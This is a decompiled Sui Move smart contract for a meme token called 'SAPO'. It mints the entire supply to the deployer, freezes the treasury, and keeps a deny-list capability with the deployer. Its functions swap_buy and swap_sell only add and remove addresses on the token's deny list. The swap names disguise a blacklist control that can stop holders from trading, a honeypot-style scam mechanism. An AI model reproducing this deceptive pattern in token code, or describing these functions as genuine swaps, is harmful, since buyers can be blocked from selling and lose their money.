module 0x9119e3b04509b0b05793508a35385620e45b3016b7c540bc2384765db17c56aa::sapo {
    struct SAPO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SAPO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SAPO>(arg0, 9, b"SAPO", b"Sapo The Frog", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmekJkYAC4jouW8bsBTPYyU1JtHtVJsCChpbesvpvSJtkW"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SAPO>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SAPO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SAPO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SAPO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SAPO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SAPO>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SAPO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SAPO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

